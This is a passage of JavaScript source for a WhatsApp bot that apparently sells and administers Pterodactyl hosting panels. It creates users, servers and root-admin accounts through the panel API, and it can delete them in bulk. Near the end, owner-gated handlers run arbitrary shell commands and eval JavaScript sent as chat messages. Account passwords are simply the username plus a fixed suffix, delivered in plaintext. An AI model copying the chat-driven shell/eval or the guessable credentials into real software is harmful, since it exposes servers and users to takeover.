  } else if (/^\d+gb$/.test(ramInput)) {
    const gb = parseInt(ramInput.replace("gb", ""));
    if (gb < 1 || gb > 10) return reply("RAM can only be from 1GB to 10GB or 'unli'");
    ram = gb * 1000;
    disknya = gb * 1000;
    cpu = 20 + (gb * 20); // example: 1gb = 40%, 2gb = 60%, etc
  } else {
    return reply("Wrong RAM format. Use like: 1gb - unli");
  }

  const desc = tanggal(Date.now());

  const getEgg = await fetch(`${global.domainV2}/api/application/nests/${nestid}/eggs/${egg}`, {
    method: "GET",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: `Bearer ${global.apikeyV2}`
    }
  });

  const eggData = await getEgg.json();
  const startup_cmd = eggData.attributes.startup;

  const createServer = await fetch(`${global.domainV2}/api/application/servers`, {
    method: "POST",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: `Bearer ${global.apikeyV2}`
    },
    body: JSON.stringify({
      name: nama,
      description: desc,
      user: parseInt(usr_id),
      egg: parseInt(egg),
      docker_image: "ghcr.io/parkervcp/yolks:nodejs_20",
      startup: startup_cmd,
      environment: {
        INST: "npm", USER_UPLOAD: "0",
        AUTO_UPDATE: "0", CMD_RUN: "npm start"
      },
      limits: {
        memory: parseInt(ram),
        swap: 0,
        disk: parseInt(disknya),
        io: 500,
        cpu: parseInt(cpu)
      },
      feature_limits: { databases: 5, backups: 5, allocations: 5 },
      deploy: {
        locations: [parseInt(loc)],
        dedicated_ip: false,
        port_range: [],
      },
    })
  });

  const result = await createServer.json();

  if (result.errors) return reply("Failed to add server:\n" + JSON.stringify(result.errors[0], null, 2));
  const server = result.attributes;

  let teks = `*Success Create New Server ✅*
- User ID : ${usr_id}
- Server ID : ${server.id}
- Server Name : ${nama}

*Server Specifications 🖥️*
- Ram : ${ram == 0 ? "Unlimited" : `${ram / 1000}GB`}
- Disk : ${disknya == 0 ? "Unlimited" : `${disknya / 1000}GB`}
- CPU : ${cpu == 0 ? "Unlimited" : cpu + "%"}`;

  await sock.sendMessage(m.chat, { text: teks, contextInfo: { isForwarded: true } }, { quoted: m });
}
break

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isWaz && !isGrupPrem) return m.reply('Only owner and groups with Reseller access')
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "2000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "3000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "4000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "5000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "6000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "7000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "8000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "9000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "10000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+"990"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Successfully created panel ✅*\nAccount data has been sent to private chat")
} else {
orang = m.chat
}
var teks = `*Your Panel Account Data 📦*

*📡 Server ID (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Server Specifications*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domain}

*Terms & Conditions :*
${global.teksPanel}
`
await fs.writeFileSync("akunpanel.txt", teks)
await sock.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
delete global.panel
}
break

case "listpanel": case "listp": case "listserver": {
if (!isWaz) return m.reply(mess.owner)
if (!global.apikey) return m.reply("Apikey not found!\nMake sure *global.apikey* is filled in settings.js!")
let page = 1
let allServers = []
  while (true) {
    let res = await fetch(`${global.domain}/api/application/servers?page=${page}`, {
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${global.apikey}`
      }
    })

    let data = await res.json()
    if (!data.data || data.data.length === 0) break

    allServers.push(...data.data)

    if (!data.meta?.pagination || page >= data.meta.pagination.total_pages) break
    page++
  }

  if (!allServers.length) return m.reply("There are no panel servers.")

  let teks = `*List of all panel servers*\n> #Total: *${allServers.length} servers*\n\n`
  let no = 1

  for (let srv of allServers) {
    let s = srv.attributes
    let uuid = s.uuid.split("-")[0]
    let status = "unknown"

    try {
      let res = await fetch(`${global.domain}/api/client/servers/${uuid}/resources`, {
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: `Bearer ${global.capikey}`
        }
      })
      let json = await res.json()
      status = json.attributes?.current_state?.toUpperCase() || "unknown"
    } catch (e) {
      status = "unknown"
    }

    teks += `┣𖣠 Server ID : *${s.id}*\n`
    teks += `┣𖣠 User ID : *${s.user}*\n`
    teks += `┣𖣠 Name : *${s.name}*\n`
    teks += `┣𖣠 RAM : *${s.limits.memory == 0 ? "Unlimited" : (s.limits.memory / 1000) + "GB"}*\n`
    teks += `┣𖣠 Status : *${status}*\n\n`
  }
  return sock.sendMessage(m.chat, { text: teks }, { quoted: m })
}
break

case "delpanel":
case "delp": {
  if (!isWaz) return m.reply(mess.owner)
  if (global.apikey.length < 1) return m.reply("Apikey not found!\nMake sure *global.apikey* is filled in settings.js!")
  if (!args[0]) return m.reply(example(`server id\n\nto see the server id type *${prefix}listpanel*`))

  let f = await fetch(global.domain + "/api/application/servers?page=1", {
    method: "GET",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: "Bearer " + global.apikey
    }
  })
  let result = await f.json()
  let servers = result.data
  let deletedUserId = null
  let deletedServerName = null

  for (let server of servers) {
    let s = server.attributes
    if (args[0] == s.id.toString()) {
      deletedUserId = s.user // <-- get user ID from server
      deletedServerName = s.name

      // Delete server
      await fetch(global.domain + `/api/application/servers/${s.id}`, {
        method: "DELETE",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json",
          Authorization: "Bearer " + global.apikey
        }
      })
    }
  }
  if (!deletedUserId) return m.reply("*Server ID* Not Found")
  // Delete user based on user ID
  await fetch(global.domain + `/api/application/users/${deletedUserId}`, {
    method: "DELETE",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: "Bearer " + global.apikey
    }
  })
  m.reply(`Successfully Deleted Panel Account *${capital(deletedServerName)}* (Server & User)`)
}
break

case "cadmin": case "cadp": {
if (!isWaz) return m.reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@epic.com"
let name = capital(args[0])
let password = username+"001"
let f = await fetch(global.domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (!m.isGroup) {
orang = m.sender
await m.reply("*Successfully created admin panel ✅*\nAccount data has been sent to private chat")
} else {
orang = m.chat
}
var teks = `*Your admin panel 📦*
* *User ID :* ${user.id}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}

*Admin Panel Rules ⚠️*
* Don't Steal Script
* Keep This Account Data Safe
* Only Create Panels as Needed, Don't Create Carelessly!
* No mischief`
await sock.sendMessage(orang, {
  text: teks,
  contextInfo: { isForwarded: true }
}, { quoted: m });
}
break

case "cadmin2": {
if (!isWaz) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@gmail.com"
let name = capital(args[0])
let password = username+"001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Successfully created admin panel ✅*\nAccount data has been sent to private chat")
} else {
orang = m.chat
}
var teks = `*Your Admin Panel Account Data 📦*

*📡 User ID (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}
* ${global.domain}

*Terms & Conditions :*
* Account expires in 1 month
* Keep this data as safe as possible
* Don't randomly delete servers!
* Caught stealing sc, auto delete account no refund!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await sock.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
}
break

case "deladmin": case "deladp": {
if (!isWaz) return m.reply(mess.owner)
if (!args[0]) return m.reply(example(`its id\n\nto see the admin id type *${prefix}listadmin*`))
let cek = await fetch(global.domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(global.domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Admin ID Not Found!")
m.reply(`Successfully Deleted Admin Panel *${capital(getid)}*`)
}
break

case "listadmin": case "listadp": {
if (!isWaz) return m.reply(mess.owner)
let cek = await fetch(global.domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + global.apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("There are no admin panels")
var teks = "*List of all admin panels*\n\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += ` ⚪ User ID : *${i.attributes.id}*
   📍 Name : *${i.attributes.first_name}*\n\n`
})
m.reply(teks)
}
break

case "hpsallserver": case "clearpanel": case "clearserver": { 
if (!isWaz) return reply(mess.owner)
await reply(`*Processing deletion of all users & panel servers ⚠️*`)
try {
const headers = {
  "Authorization": "Bearer " + global.apikey,
  "Content-Type": "application/json",
  "Accept": "application/json",
};

async function getUsers() {
  try {
    const res = await axios.get(`${global.domain}/api/application/users`, { headers });
    return res.data.data;
  } catch (error) {
    reply(JSON.stringify(error.response?.data || error.message, null, 2))
    return [];
  }
}

async function getServers() {
  try {
    const res = await axios.get(`${global.domain}/api/application/servers`, { headers });
    return res.data.data;
  } catch (error) {
    reply(JSON.stringify(error.response?.data || error.message, null, 2))
    return [];
  }
}
async function deleteServer(serverUUID) {
  try {
    await axios.delete(`${global.domain}/api/application/servers/${serverUUID}`, { headers });
    console.log(`Server ${serverUUID} successfully deleted.`);
  } catch (error) {
    console.error(`Failed to delete server ${serverUUID}:`, error.response?.data || error.message);
  }
}
async function deleteUser(userID) {
  try {
    await axios.delete(`${global.domain}/api/application/users/${userID}`, { headers });
    console.log(`User ${userID} successfully deleted.`);
  } catch (error) {
    console.error(`Failed to delete user ${userID}:`, error.response?.data || error.message);
  }
}
async function deleteNonAdminUsersAndServers() {
  const users = await getUsers();
  const servers = await getServers();
  let totalSrv = 0
  for (const user of users) {
    if (user.attributes.root_admin) {
      console.log(`Skipping admin: ${user.attributes.username}`);
      continue; // Skip admin
    }
    const userID = user.attributes.id;
    const userEmail = user.attributes.email;
    console.log(`Deleting user: ${user.attributes.username} (${userEmail})`);
    // Find servers owned by this user
    const userServers = servers.filter(srv => srv.attributes.user === userID);
    // Delete all this user's servers
    for (const server of userServers) {
      await deleteServer(server.attributes.id);
      totalSrv += 1
    }
    // Delete user after all their servers are deleted
    await deleteUser(userID);
  }
await reply(`*Finished Cleaning the Panel ✅*

- Total *${totalSrv}* (user & server) panels deleted 

*⚠️ Deleted servers are not admin panels*`)
}
// Run function
return deleteNonAdminUsersAndServers();
} catch (err) {
return reply(`${JSON.stringify(err, null, 2)}`)
}
}
break

case "addserver": case "addsrv": {
  if (!isWaz) return m.reply(mess.owner)
  if (!text) return m.reply(example(`id,name,ram\nType: *${prefix}listpanel* to see id`));
  let [usr_id, nama, ramInput] = text.split(",");
  if (!usr_id || !nama || !ramInput) return m.reply(example(`id,name,ram\nType: *${prefix}listpanel* to see id`));
  usr_id = usr_id.trim();
  nama = nama.trim();
  ramInput = ramInput.trim().toLowerCase();

  let ram, disknya, cpu;

  if (["unli", "unlimited"].includes(ramInput)) {
    ram = disknya = cpu = 0;
  } else if (/^\d+gb$/.test(ramInput)) {
    const gb = parseInt(ramInput.replace("gb", ""));
    if (gb < 1 || gb > 10) return reply("RAM can only be from 1GB to 10GB or 'unli'");
    ram = gb * 1000;
    disknya = gb * 1000;
    cpu = 20 + (gb * 20); // example: 1gb = 40%, 2gb = 60%, etc
  } else {
    return reply("Wrong RAM format. Use like: 1gb - unli");
  }

  const desc = tanggal(Date.now());

  const getEgg = await fetch(`${global.domain}/api/application/nests/${nestid}/eggs/${egg}`, {
    method: "GET",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: `Bearer ${global.apikey}`
    }
  });

  const eggData = await getEgg.json();
  const startup_cmd = eggData.attributes.startup;

  const createServer = await fetch(`${global.domain}/api/application/servers`, {
    method: "POST",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: `Bearer ${global.apikey}`
    },
    body: JSON.stringify({
      name: nama,
      description: desc,
      user: parseInt(usr_id),
      egg: parseInt(egg),
      docker_image: "ghcr.io/parkervcp/yolks:nodejs_20",
      startup: startup_cmd,
      environment: {
        INST: "npm", USER_UPLOAD: "0",
        AUTO_UPDATE: "0", CMD_RUN: "npm start"
      },
      limits: {
        memory: parseInt(ram),
        swap: 0,
        disk: parseInt(disknya),
        io: 500,
        cpu: parseInt(cpu)
      },
      feature_limits: { databases: 5, backups: 5, allocations: 5 },
      deploy: {
        locations: [parseInt(loc)],
        dedicated_ip: false,
        port_range: [],
      },
    })
  });

  const result = await createServer.json();

  if (result.errors) return reply("Failed to add server:\n" + JSON.stringify(result.errors[0], null, 2));
  const server = result.attributes;

  let teks = `*Success Create New Server ✅*
- User ID : ${usr_id}
- Server ID : ${server.id}
- Server Name : ${nama}

*Server Specifications 🖥️*
- Ram : ${ram == 0 ? "Unlimited" : `${ram / 1000}GB`}
- Disk : ${disknya == 0 ? "Unlimited" : `${disknya / 1000}GB`}
- CPU : ${cpu == 0 ? "Unlimited" : cpu + "%"}`;

  await sock.sendMessage(m.chat, { text: teks, contextInfo: { isForwarded: true } }, { quoted: m });
}
break;

//=============================================//
default: {
    if (body.startsWith("$")) { 
        if (!isWaz) return reply(mess.owner)
        exec(body.slice(1).trim(), (err, stdout) => {
            if (err) return m.reply(`${err}`);
            if (stdout) return m.reply(`${stdout}`);
        });
    }

    if (body.startsWith(">")) { 
        if (!isWaz) return reply(mess.owner)
        try {
            let code = body.slice(1).trim();
            let result = await eval(`(async () => { 
                try { return ${code} } catch { return await ${code} } 
            })()`); 
            m.reply(util.format(result));
        } catch (e) {
            m.reply(String(e));
        }
    }

    if (body.startsWith("eval")) { 
        if (!isWaz) return reply(mess.owner)
        try {
            let code = body.slice(4).trim();
            let result = await eval(`(async () => {
                ${code}
            })()`);
            m.reply(util.format(result));
        } catch (e) {
            m.reply(String(e));
        }
     }
   }
 }
} catch (err) {
console.log(err)
await sock.sendMessage(global.owner+"@s.whatsapp.net", {text: err.toString()}, {quoted: m})
}}

//=============================================//
const __filename = fileURLToPath(import.meta.url);
fsSync.watchFile(__filename, () => { 
    fsSync.unwatchFile(__filename); 
    console.log(chalk.white.bold("~> Update File :"), chalk.green.bold(__filename));
    import(`${pathToFileURL(__filename).href}?update=${Date.now()}`);
});